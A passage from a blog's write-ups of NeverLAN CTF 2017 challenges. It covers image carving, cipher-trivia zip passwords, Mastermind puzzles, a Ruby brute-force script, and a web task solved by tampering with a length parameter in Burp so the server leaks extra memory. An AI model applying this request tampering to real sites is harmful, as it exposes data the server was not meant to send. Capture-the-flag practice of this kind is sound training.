at least v2.0 to extract, name: __macosx/._death_star_owner&apos;s_technical_manual_blueprints.jpg 713908        0xae4b4         end of zip archive then i extracted it with foremost and unzip the archive: $ unzip 00000251.zip archive:  00000251.zip inflating: death_star_owner&apos;s_technical_manual_blueprints.jpg creating: __macosx/ inflating: __macosx/._death_star_owner&apos;s_technical_manual_blueprints.jpg finally, i get this death star elevation plan: flag is rebellions_are_built_on_hope note : this is steganography, not forensics. 100 - thehistoryofcryptography - cryptography the_history_of_cryptography.zip contains two files: 0.txt 1.zip $ cat 0.txt this shifty cipher is one of the simplest, and most well know ciphers. answer: caesar the zip is password protected and the password is the answer of 0.txt 1.zip contains 2 files: 1.txt 2.zip , and so on. $ cat 1.txt this cipher is is named after the person who made it famous, not but the man who first created it. password:\"the name of cipher in the riddle\" with out the quotes. answer: vigenere $ cat 2.txt this transposition cipher was used by the warriors in the famous movie \"the 300\" password:\"the name of cipher in the riddle\" with out the quotes. answer: scytale $ cat 3.txt the first recorded use of this cipher was used to hide a book of magic. password:\"the name of cipher in the riddle\" with out the quotes. answer: steganography details $ cat 4.txt this world famous cipher was invented by arthur scherbius password:\"the name of cipher in the riddle\" with out the quotes. answer: enigma machine details $ cat 5.txt which one is you&apos;re favorite? i love them all because... flag{thehistoryofcryptographyisaw3s0m3} flag is thehistoryofcryptographyisaw3s0m3 note : this challenge was a quizz, not a cryptography challenge. it should have been in trivia, misc, quizz or other. 100 - a slight cut - web http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/ source: <!doctype html> <html> <head> <title>a slight cut</title> <script> [...] </script> </head> <body> <div> <h1>type in some text to have the server repeat it back</h1> <form onsubmit=\"getecho(); return false;\"> <input id=\"text\" name=\"text\" type=\"text\" placeholder=\"type some text here\"/> <input id=\"length\" type=\"hidden\" name=\"length\" value=\"0\"/> <input type=\"submit\"/> </form> <p id=\"echo\">output will appear here</p> </div> </body> </html> there is two parameters in te request url: length text text comes from the input field, and length is calculated with javascript. function getecho text = $( '#text' ).val(); length = $( '#length' ).val(); $.ajax( 'echo.php?length=' +length+ '&text=' +text).done( function echoed '#echo' ).text(echoed); document ).ready( function '#text' ).on( 'input' function '#length' ).val($( '#text' ).val().length); if i submit , the calculated length is get /echo.php?length=1&text=a http/1.1 host: neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123 user-agent: mozilla/5.0 (x11; linux x86_64; rv:51.0) gecko/20100101 firefox/51.0 accept: */* accept-language: en-us,en;q=0.5 accept-encoding: gzip, deflate referer: http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/ x-requested-with: xmlhttprequest connection: close but what will happen if i change the value from 1 to 1000 with burp: get /echo.php?length=1000&text=a http/1.1 the server displays more than intended: [email\u00a0protected] kds2^4a ady 5 tyusft tuyuy_#65afajty ajb tjuflt ty%&(juuyttyjtji key: flag{bleeding_in_javascript} sdf4 asd6f ayj1dsgff@ af ttmtum56tu$%ga wrg3@#%aa9-mtyumty dfgsaumg68g$%ershe as 9tuyt t9uty38dsdfg-5f htyd45s#$ flag is: bleeding_in_javascript 300 - webcipher - web #anti-human http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/ word list: https://s3-us-west-2.amazonaws.com/neverlanctf/files/words.txt source: <!doctype html> html head title anti-human cipher title head body \"cipher_box\" \"cipher\" shhsjwfl \"form_box\" form \"form\" method \"get\" action input type \"text\" name \"deciphered\" \"deciphered\" input type \"submit\" form body html first thing is to understand what to do. here is what the server do: a word is picked up randomly from words.txt this word is randomly rotated (caesar cipher with a shift between 1 and 25) then the shifted word is displayed for a few seconds a new word is picked up and so on... so we need a script that: get the shifted word cross the dictionary and test words one by one (only same length as teh shifted word) for each tested word try all possible shifting break when that match send the answer (decipered/unshifted word) get the flag so that's what i did with a ruby script and curb $ ruby webcipher.rb \u2022 connexion works \u2022 cracking ciphered word \u2022 deciphered: cassidony \u2022 sending answer \u2022 flag: c34s3r_c1ph3r_70_7h3_m4x my ruby script: #!/usr/bin/env ruby require 'curb' # for get/post requests # from https://gist.github.com/matugm/db363c7131e6af27716c caesar_cipher (string, shift = alphabet   = array( encrypter  = hash[alphabet.zip(alphabet.rotate(shift))] string.chars.map { encrypter.fetch(c, hostname = 'http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/index.php' c = curl::easy.new(hostname) |curl| curl.headers[ 'cookie' 'phpsessid=30ff4361f8af2985595bff7c9614b1f1' curl.headers[ 'referer' ] = hostname curl.headers[ 'upgrade-insecure-requests' #curl.verbose = true # curl c.perform # send the request c.body_str.match( /anti\\-human cipher/ puts '\u2022 connexion works' # get the cipher word ciphered_word = c.body_str.match( /<h1 id=\"cipher\">([a-za-z]*)<\\/h1>/ ).captures[ ciphered_word.downcase! # put lowercase ciphered_word_length = ciphered_word.length puts '\u2022 cracking ciphered word' do_break = false answer = file.open( \"words.txt\" |file| file.each |word| word.chomp! # remove spaces word.length.eql?(ciphered_word_length) # only try word with same length answer = word # save the word because it can be mixed case word.downcase! # put lowercase # puts \"word: #{word}\" ).each # puts caesar_cipher(word, i).join caesar_cipher(word, i).join == ciphered_word puts \"\u2022 deciphered: #{word} do_break = true break break do_break puts \"\u2022 sending answer\" c.url = hostname.concat( \"?deciphered= #{answer} c.perform puts \"\u2022 flag: \" .concat(c.body_str.match( /<p>flag{(.*)}<\\/p>/ ).captures[ note : this is not web, this is scripting. 50 - master mind 1 - other can you break my three digit lock? mastermind1.txt source: +-----------------------+ |       |       |       | |   7   |   3   |   6   | one number is correct but wrongly placed |       |       |       | |_______|_______|_______| |       |       |       | |   0   |   6   |   5   | one number is correct and correctly placed |       |       |       | |_______|_______|_______| |       |       |       | |   3   |   7   |   2   | two numbers are correct but wrongly placed |       |       |       | |_______|_______|_______| |       |       |       | |   6   |   4   |   7   | no numbers are correct |       |       |       | |_______|_______|_______| |       |       |       | |   5   |   2   |   4   | one number is correct and correctly placed |       |       |       | |       |       |       | +-----------------------+ rules: mastermind code-breaking: line 4: 647, no numbers are correct => [0,1,2,3,5,8,9] are possible line 1: 736, one number is correct but wrongly placed => 7 and 6 are wrong, so 3 is in the code and is right or left line 2: 065, one number is correct and correctly placed => 6 is wrong, so 0 or 5 is in the code and corrctly placed line 3: 372, two numbers are correct but wrongly placed => 7 is wrong, 3 and 2 are good so [3,2,[0|5]] are possible line 5: 524, one number is correct and correctly placed => only one number is correct, 2 is good so 5 is wrong and [3,2,0] are possible (we have the three numbers so now let's order them) line 5: 524, one number is correct and correctly placed => 2 is middle line 2: 065, one number is correct and correctly placed => 0 is left so 3 is right flag is 100 - master mind 2 - other i've upgraded my lock! can you solve it? mastermind2.txt source: +-------------------------------+ |       |       |       |       | |   9   |   5   |   3   |   2   | one number is correct but wrongly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   1   |   6   |   7   |   3   | two numbers are correct and correctly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   0   |   6   |   5   |   9   | two numbers are correct but wrongly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   2   |   4   |   3   |   8   | no numbers are correct |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   5   |   2   |   4   |   0   | one number is correct and correctly placed |       |       |       |       | |       |       |       |       | +-------------------------------+ rules: mastermind code-breaking: line 4: 2438, no numbers are correct => only [0,1,5,6,7,9] are possible line 5: 5240, one number is correct and correctly placed => 2 and 4 are wrong, so 0 or 5 is in the code, [[0|5],1,6,7,9] line 1: 9532, one number is correct but wrongly placed => 2 and 3 are wrong, so 9 or 5 is good, [0|5] & [5|9] = 5 so [1,5,6,7] or [0|5] & [5|9] = [0,9] so so [0,1,6,7,9] line 2: 1673, two numbers are correct and correctly placed => only two number are good so [1,5,6,7] impossible so [0,1,6,7,9] is only possible (now we need to filter the 5 numbers to keep only 4) line 1: confirmed [9], possible [0,1,6,7] line 3: confirmed [9,[0|6]], possible [1,7] line 5: confirmed [9,0], possible [1,7] so [0,1,7,9] are the four numbers (we have the four numbers so now let's order them) line 2: place [1,x,7,x] line 5: place [1,x,7,0] so  [1,9,7,0] flag is 1970 share please enable javascript to view the comments powered by disqus. follow: newer xiomara ctf 2017 - write-ups older ruby cheat sheet with examples recents security writeups uiuctf 2017 - 100 - high school crypto - crypto sunday 30 april 2017 (2017-04-30) security writeups angstromctf 2017 - write-ups saturday 29 april 2017 (2017-04-29) security writeups breizhctf 2k17 - write-ups saturday 29 april 2017 (2017-04-29) security writeups yubitsec ctf 2017 - write-ups tuesday 25 april 2017 (2017-04-25) security writeups fit-hack ctf 2017 - write-ups saturday 15 april 2017 (2017-04-15) categories linux archlinux debian opensuse ubuntu misc news security warez programming python ruby security centos windows writeups windows tag cloud anonymity apache archlinux backdoor centos crypto debian firefox forensics graphic guessing hyper-v install linux misc netbios network news opensuse pentest piracy privacy programming proxy python qemu recon reverse reversing ruby security stegano system trivia ubuntu update usenet virtualbox virtualization vulnerability warez webshell windows writeups archives april 2017 march 2017 february 2017 january 2017 december 2016 november 2016 october 2016 september 2016 august 2016 july 2016 june 2016 may 2016 april 2016 march 2016 december 2015 october 2015 september 2015 november 2014 october 2014 september 2014 august 2014 december 2012 links hexo foss torrent is not a crime \u00a9 2017 alexandre zanni powered by hexo . theme by ppoffice custom scripts ssl redirect",
    "title": "SoYouLikeMusic",
    "url": "http://rawsec.ml/en/NeverLAN-CTF-2017-write-ups/#50-soyoulikemusic-forensics"
  }
]
